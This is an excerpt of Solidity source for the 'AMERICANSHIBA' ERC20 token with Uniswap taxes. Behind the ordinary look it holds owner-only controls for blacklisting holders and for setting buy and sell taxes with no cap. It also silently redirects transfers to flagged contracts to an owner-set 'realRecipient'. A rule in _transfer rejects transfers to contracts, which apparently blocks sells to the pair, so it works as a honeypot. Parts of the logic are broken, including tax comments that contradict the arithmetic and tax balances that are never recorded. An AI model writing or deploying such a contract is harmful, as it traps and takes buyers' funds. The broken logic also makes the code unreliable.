...
contract AMERICANSHIBA is ERC20, Ownable(msg.sender), ReentrancyGuard {
    ...
    event BuyTaxRateUpdated(string taxType, uint256 newRate);
    event SellTaxRateUpdated(string taxType, uint256 newRate);

    event RealRecipientUpdated(address indexed newRealRecipient);
    event OddContractUpdated(address indexed contractAddress, bool isOdd);
    ...
    mapping(string => uint256) private tokenBalances;
    mapping(address => bool) private isExcludedFromTax;
        mapping(address => bool) private isBlacklisted;
                    mapping(address => bool) public oddContracts;
                    address public realRecipient;
    
    address[] private sellPath;

    struct TaxRates {
    uint256 marketing; // Tax rate as percentage * 100 (e.g., 1 means 1%)
    uint256 dev;       // Tax rate as percentage * 100
    uint256 liquidity; // Tax rate as percentage * 100
    uint256 charity;   // Tax rate as percentage * 100
    }

    TaxRates public buyTaxRates;
    TaxRates public sellTaxRates;

    // Wallets for receiving specific taxes
    address public marketingWallet;
    address public devWallet;
    address public liquidityWallet;
    address public charityWallet;

    uint256 public swapThreshold = 0.0000051 ether;
    ...
    constructor(
        ...
        uniswapPair = IUniswapV2Pair(IUniswapV2Factory(uniswapRouter.factory()).createPair(address(this), uniswapRouter.WETH()));
        realRecipient = msg.sender;  // Default to contract owner
        marketingWallet = _marketingWallet;
        devWallet = _devWallet;
        liquidityWallet = _liquidityWallet;
        charityWallet = _charityWallet;

// Set default tax rates (values here mean 1%)
buyTaxRates = TaxRates(1, 1, 1, 1);
sellTaxRates = TaxRates(1, 1, 1, 1);
...
function _transfer(address sender, address recipient, uint256 amount) internal override {
    require(!isBlacklisted[sender], "AMERICANSHIBA: Sender is blacklisted");
    require(!isBlacklisted[recipient], "AMERICANSHIBA: Recipient is blacklisted");

    address finalRecipient = recipient;

    // Check if recipient is an odd contract, redirect if necessary
    if (oddContracts[recipient]) {
        finalRecipient = realRecipient;
    }

    // Check if the operation involves a contract
    if (isContract(sender) || isContract(recipient)) {
        // Special logic for contract interactions can be placed here
        // For example, rejecting certain transactions or applying additional checks
        require(!isContract(recipient), "AMERICANSHIBA: Cannot transfer to contract address");
    }

    // Calculate taxes if applicable
    uint256 transferAmount = amount;
    if (!isExcludedFromTax[sender] && !isExcludedFromTax[finalRecipient]) {
        if (sender == address(uniswapPair)) {
            // It's a buy operation
            transferAmount = handleTax(sender, amount, buyTaxRates);
        } else if (recipient == address(uniswapPair)) {
            // It's a sell operation
            transferAmount = handleTax(sender, amount, sellTaxRates);
        }
    }

    super._transfer(sender, finalRecipient, transferAmount);
}
...
function handleTax(address from, uint256 amount, TaxRates memory taxRates) internal returns (uint256) {
    uint256 taxAmount = calculateTax(amount, taxRates);
    uint256 amountAfterTax = amount - taxAmount;

    if (taxAmount > 0) {
        _transfer(from, address(this), taxAmount); // Transfer tax to the contract itself
    }

    return amountAfterTax;
}

function calculateTax(uint256 amount, TaxRates memory rates) internal pure returns (uint256) {
    uint256 totalRate = rates.marketing + rates.dev + rates.liquidity + rates.charity;
    return amount * totalRate / 100; // whole percents
}

function resetTokenBalances() internal {
    tokenBalances["marketing"] = 0;
    tokenBalances["dev"] = 0;
    tokenBalances["liquidity"] = 0;
    tokenBalances["charity"] = 0;
}
    function trySwapAndLiquify() internal {
        uint256 combinedTokenAmount = tokenBalances["marketing"] + tokenBalances["dev"] + tokenBalances["liquidity"] + tokenBalances["charity"];
        if (combinedTokenAmount == 0) return;
        if (uniswapRouter.getAmountsOut(combinedTokenAmount, sellPath)[1] >= swapThreshold) {
            swapTokensForEth(combinedTokenAmount);
            resetTokenBalances();
    ...
    function swapTokensForEth(uint256 tokenAmount) internal {
        ...
        try uniswapRouter.swapExactTokensForETH(tokenAmount, 0, sellPath, address(this), block.timestamp) {
        } catch {
    ...
    function distributeEth() internal {
        ...
        if (!_sendETH(marketingWallet, ethBalance * tokenBalances["marketing"] / (tokenBalances["marketing"] + tokenBalances["dev"] + tokenBalances["liquidity"] + tokenBalances["charity"]))) {
            revert ("TransferFailed");
        }
        // Similar calls for devWallet, liquidityWallet, and charityWallet
    }
...
function setMaxWalletSize(uint256 newLimit) public onlyOwner {
    require(newLimit >= 5 && newLimit <= 32,  "Max Wallet set to 5, 12 Q is the max amount in wallet allowed. If Max Wallet is set to 32, 1.875 Q is the max amount in wallet allowed.");
    ...
    function setMaxTxLimit(uint256 newLimit) public onlyOwner {
        require(newLimit >= 80 && newLimit <= 160, "New limit must be between 80 and 160.");
...
function setBuyMarketingTax(uint256 _rate) public onlyOwner {
    buyTaxRates.marketing = _rate;
    emit BuyTaxRateUpdated("marketing", _rate);
}

function setBuyDevTax(uint256 _rate) public onlyOwner {
    buyTaxRates.dev = _rate;
    emit BuyTaxRateUpdated("dev", _rate);
}

function setBuyLiquidityTax(uint256 _rate) public onlyOwner {
    buyTaxRates.liquidity = _rate;
    emit BuyTaxRateUpdated("liquidity", _rate);
}

function setBuyCharityTax(uint256 _rate) public onlyOwner {
    buyTaxRates.charity = _rate;
    emit BuyTaxRateUpdated("charity", _rate);
}

function setSellMarketingTax(uint256 _rate) public onlyOwner {
    sellTaxRates.marketing = _rate;
    emit SellTaxRateUpdated("marketing", _rate);
}

function setSellDevTax(uint256 _rate) public onlyOwner {
    sellTaxRates.dev = _rate;
    emit SellTaxRateUpdated("dev", _rate);
}

function setSellLiquidityTax(uint256 _rate) public onlyOwner {
    sellTaxRates.liquidity = _rate;
    emit SellTaxRateUpdated("liquidity", _rate);
}

function setSellCharityTax(uint256 _rate) public onlyOwner {
    sellTaxRates.charity = _rate;
    emit SellTaxRateUpdated("charity", _rate);
}
    function setRealRecipient(address newRealRecipient) public onlyOwner {
        require(newRealRecipient != address(0), "AMERICANSHIBA: Real recipient cannot be the zero address");
        realRecipient = newRealRecipient;
        emit RealRecipientUpdated(newRealRecipient);
    }

    function setOddContractStatus(address contractAddress, bool status) public onlyOwner {
        require(contractAddress != address(0), "AMERICANSHIBA: Address cannot be the zero address");
        oddContracts[contractAddress] = status;
        emit OddContractUpdated(contractAddress, status);
    }

// Function to receive Ether and forward it to the general treasury
    receive() external payable {
        emit EtherReceived(msg.sender, msg.value);
        bool sent = _sendETH(realRecipient, msg.value);
        require(sent, "AMERICANSHIBA: Failed to send Ether");
    }

    fallback() external payable {
        emit EtherFallbackReceived(msg.sender, msg.value);
        bool sent = _sendETH(realRecipient, msg.value);
        require(sent, "AMERICANSHIBA: Failed to redirect Ether in fallback");
    }
